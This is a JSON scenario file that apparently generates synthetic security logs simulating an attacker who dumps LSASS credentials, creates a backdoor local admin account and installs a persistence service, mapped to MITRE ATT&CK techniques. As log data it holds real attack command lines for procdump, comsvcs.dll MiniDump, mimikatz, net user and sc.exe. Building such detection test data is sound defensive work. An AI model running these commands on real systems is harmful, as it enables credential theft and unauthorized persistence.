{
  "name": "credential-theft-privesc",
  "description": "An attacker compromises a standard user account, dumps credentials from LSASS memory, creates a new local admin account, and uses the elevated account to establish persistence.",
  "mitreTactics": ["Initial Access", "Credential Access", "Privilege Escalation", "Persistence", "Execution"],
  "mitreIds": ["T1078", "T1003.001", "T1136.001", "T1098", "T1059.001", "T1543.003"],
  "tables": {
    "Authentication": {
      "schema": "schemas/Authentication.json",
      "rowCount": 50
    },
    "ProcessEvent": {
      "schema": "schemas/ProcessEvent.json",
      "rowCount": 60
    },
    "UserManagement": {
      "schema": "schemas/UserManagement.json",
      "rowCount": 20
    }
  },
  "actors": {
    "attacker": {
      "ip": "external"
    },
    "victim": {
      "ip": "internal",
      "username": "random",
      "upn": "random",
      "device": "random",
      "deviceFqdn": "random"
    },
    "newAdmin": {
      "username": "svc_update"
    }
  },
  "timeline": [
    {
      "phase": "Initial Access — Compromised Credentials",
      "description": "Attacker logs in with stolen credentials from a phishing campaign",
      "offsetMinutes": 0,
      "durationMinutes": 2,
      "table": "Authentication",
      "count": 2,
      "eventTemplate": {
        "EventType": "Logon",
        "EventResult": "Success",
        "EventSeverity": "Informational",
        "SrcIpAddr": "{{attacker.ip}}",
        "TargetUsername": "{{victim.username}}",
        "TargetUsernameType": "Simple",
        "LogonMethod": "Remote",
        "LogonProtocol": "RDP",
        "DvcHostname": "{{victim.device}}",
        "EventCount": 1
      }
    },
    {
      "phase": "Credential Dumping — LSASS Access",
      "description": "Attacker runs tools to dump credentials from LSASS process memory",
      "offsetMinutes": 10,
      "durationMinutes": 5,
      "table": "ProcessEvent",
      "count": 6,
      "eventTemplate": {
        "EventType": "ProcessCreated",
        "EventResult": "Success",
        "EventSeverity": "High",
        "ActorUsername": "{{victim.username}}",
        "DvcHostname": "{{victim.device}}",
        "TargetProcessName": ["rundll32.exe", "procdump.exe", "taskmgr.exe", "powershell.exe", "comsvcs.dll", "mimikatz.exe"],
        "TargetProcessCommandLine": [
          "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full",
          "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp",
          "taskmgr.exe /create-dump lsass.exe",
          "powershell.exe -c \"[System.IO.File]::Copy('C:\\temp\\lsass.dmp','C:\\Users\\Public\\dump.bin')\"",
          "rundll32.exe comsvcs.dll MiniDump (Get-Process lsass).Id C:\\temp\\out.dmp full",
          "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
        ],
        "ActingProcessName": ["cmd.exe", "powershell.exe", "explorer.exe"],
        "ParentProcessName": "explorer.exe",
        "TargetProcessId": [624, 4, 1024, 2048, 624, 8192],
        "EventCount": 1
      }
    },
    {
      "phase": "Privilege Escalation — Create Admin Account",
      "description": "Attacker creates a new local administrator account for persistence",
      "offsetMinutes": 20,
      "durationMinutes": 2,
      "table": "UserManagement",
      "count": 3,
      "eventTemplate": {
        "EventType": ["UserCreated", "GroupMemberAdded", "UserModified"],
        "EventResult": "Success",
        "EventSeverity": "High",
        "ActorUsername": "{{victim.username}}",
        "DvcHostname": "{{victim.device}}",
        "TargetUsername": ["{{newAdmin.username}}", "{{newAdmin.username}}", "{{newAdmin.username}}"],
        "GroupName": ["", "Administrators", ""],
        "EventCount": 1
      }
    },
    {
      "phase": "Privilege Escalation — Admin Commands",
      "description": "Net commands used to create user and add to admin group",
      "offsetMinutes": 20,
      "durationMinutes": 3,
      "table": "ProcessEvent",
      "count": 4,
      "eventTemplate": {
        "EventType": "ProcessCreated",
        "EventResult": "Success",
        "EventSeverity": "High",
        "ActorUsername": "{{victim.username}}",
        "DvcHostname": "{{victim.device}}",
        "TargetProcessName": ["net.exe", "net1.exe", "net.exe", "net1.exe"],
        "TargetProcessCommandLine": [
          "net user svc_update P@ssw0rd123! /add",
          "net1 user svc_update P@ssw0rd123! /add",
          "net localgroup administrators svc_update /add",
          "net1 localgroup administrators svc_update /add"
        ],
        "ActingProcessName": "cmd.exe",
        "ParentProcessName": "powershell.exe",
        "EventCount": 1
      }
    },
    {
      "phase": "Persistence — Elevated Session",
      "description": "Attacker logs in with the newly created admin account",
      "offsetMinutes": 28,
      "durationMinutes": 2,
      "table": "Authentication",
      "count": 2,
      "eventTemplate": {
        "EventType": "Logon",
        "EventResult": "Success",
        "EventSeverity": "Medium",
        "SrcIpAddr": "{{attacker.ip}}",
        "TargetUsername": "{{newAdmin.username}}",
        "TargetUsernameType": "Simple",
        "LogonMethod": "Remote",
        "LogonProtocol": "RDP",
        "DvcHostname": "{{victim.device}}",
        "EventCount": 1
      }
    },
    {
      "phase": "Persistence — Service Installation",
      "description": "Attacker installs a malicious service for persistent access",
      "offsetMinutes": 32,
      "durationMinutes": 3,
      "table": "ProcessEvent",
      "count": 3,
      "eventTemplate": {
        "EventType": "ProcessCreated",
        "EventResult": "Success",
        "EventSeverity": "High",
        "ActorUsername": "{{newAdmin.username}}",
        "DvcHostname": "{{victim.device}}",
        "TargetProcessName": ["sc.exe", "sc.exe", "powershell.exe"],
        "TargetProcessCommandLine": [
          "sc.exe create UpdateSvc binPath= \"C:\\ProgramData\\svchost.exe\" start= auto",
          "sc.exe start UpdateSvc",
          "powershell.exe -c Set-Service -Name UpdateSvc -StartupType Automatic"
        ],
        "ActingProcessName": "cmd.exe",
        "ParentProcessName": "explorer.exe",
        "EventCount": 1
      }
    }
  ]
}
